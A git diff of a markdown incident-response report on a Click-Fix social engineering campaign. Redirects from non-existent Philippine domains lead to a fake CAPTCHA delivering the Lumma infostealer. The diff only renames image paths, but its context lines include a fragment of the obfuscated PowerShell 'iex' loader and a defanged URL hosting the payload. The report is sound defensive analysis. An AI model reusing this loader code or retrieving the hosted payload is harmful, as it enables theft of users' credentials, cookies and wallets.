@@ -20,7 +20,7 @@ The script was linked to Lumma Stealer, an infostealer designed to exfiltrate se
 
 This incident is part of the broader Click-Fix social engineering campaign, which tricks users into executing malware under the guise of system fixes or CAPTCHA verification.
 
-![](/images/articles/ph-domain-redirection-ir-report/flow.png)
+![](/images/articles/prt/flow.png)
 
 ## Technical Findings
 
@@ -38,11 +38,11 @@ iex$all='using System;using System.Runtime.InteropServices;public static class K
 ```
  
 
-![](/images/articles/ph-domain-redirection-ir-report/payloads.png)
+![](/images/articles/prt/payloads.png)
 
 A website containing .enx files is considered malicious as these files are often linked to encrypted, obfuscated, or potentially harmful content. Cybercriminals may use them to distribute malware, ransomware, or execute unauthorized actions on a victim’s system. Users should exercise caution, avoid downloading such files from untrusted sources, and scan them with security tools to prevent potential threats.
 
-![](/images/articles/ph-domain-redirection-ir-report/browserh.png)
+![](/images/articles/prt/browserh.png)
 
 The user searched for the hrlink in the browser using Bing and noticed that it redirected multiple times until landing on a fake CAPTCHA that contained Infostealer.
 
@@ -52,39 +52,39 @@ hxxps://objectstorage.ap-singapore-2.oraclecloud.com/n/ax4mqlu25efi/b/lakmewbkt/
 ```
  
 
-![](/images/articles/ph-domain-redirection-ir-report/details.png)
+![](/images/articles/prt/details.png)
 
-![](/images/articles/ph-domain-redirection-ir-report/hits.png)
+![](/images/articles/prt/hits.png)
 
 This webpage hosts Infostealer, a well-known information-stealing malware designed to exfiltrate sensitive data such as login credentials, browser cookies, cryptocurrency wallets, and system information. The site is part of a malicious redirection chain, where users searching for a specific link (e.g., hrlink) are redirected multiple times before landing on a deceptive fake CAPTCHA page.
 
-![](/images/articles/ph-domain-redirection-ir-report/correct.png)
+![](/images/articles/prt/correct.png)
 
 Every non-existent domain .ph and .com.ph is entered, we are redirected to various domains, some related to cryptocurrency, gaming, and even a fake CAPTCHA that delivers Infostealer. Proof of this can be seen in the image below.
 
-![](/images/articles/ph-domain-redirection-ir-report/nslookup.png)
+![](/images/articles/prt/nslookup.png)
 
 The IP associated with non-existent .com.ph domains that redirect to other websites has recorded multiple hits.
 
-![](/images/articles/ph-domain-redirection-ir-report/hits2.png)
+![](/images/articles/prt/hits2.png)
 
 ## Malware Findings
 
-![](/images/articles/ph-domain-redirection-ir-report/die.png)
+![](/images/articles/prt/die.png)
 
 Analysis revealed that the file Erratic1Crank1Banshee1Drainpipe.enx was not packed and was instead in plain text format.
 
-![](/images/articles/ph-domain-redirection-ir-report/static1.png)
+![](/images/articles/prt/static1.png)
 
-![](/images/articles/ph-domain-redirection-ir-report/static2.png)
+![](/images/articles/prt/static2.png)
 
 The user followed the fake CAPTCHA steps as instructed, ultimately completing the attacker’s intended objective.
 
-![](/images/articles/ph-domain-redirection-ir-report/socialengineering.png)
+![](/images/articles/prt/socialengineering.png)
 
 Attempts to replicate the attack failed as the malicious domain was already offline, preventing further testing.
 
-![](/images/articles/ph-domain-redirection-ir-report/attempts.png)
+![](/images/articles/prt/attempts.png)
 
 ## Conclusion
 
@@ -118,7 +118,7 @@ $decryptedString
 
 Now open a controlled environment where you can perform malware analysis and run the script in PowerShell.
 
-![](/images/articles/ph-domain-redirection-ir-report/decrypted.png)
+![](/images/articles/prt/decrypted.png)
 
 ## Indicators of Compromise (IOCs)
 
